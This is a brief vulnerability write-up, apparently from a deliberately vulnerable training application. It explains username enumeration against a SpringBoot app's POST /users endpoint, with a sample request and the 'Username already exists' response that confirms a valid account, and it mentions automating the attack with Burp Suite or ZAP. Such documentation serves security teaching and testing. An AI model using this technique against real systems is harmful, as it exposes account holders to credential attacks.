# Brute-Force Valid Username
A type of brute force attack that finds valid usernames (usernames of existing accounts) not belonging to the attacker.

## Exploitation
**Prerequisites:** _None_

**Location:** _POST /users_

Brute-Force valid username present within SpringBoot code by application returning if the username belongs to an existing account.  Below is an exploitation example:

    POST /users
    raw:
    {
        "username" : "admin",
        "password" : "password"
    }
    
Burp Suite, ZAP, or equivalent technologies can be used to automate brute-forcing attempts against the web application using the general format above.

Successful exploitation looks like:

    {
        "success": false,
        "code": 400,
        "message": "Username already exists"
    }
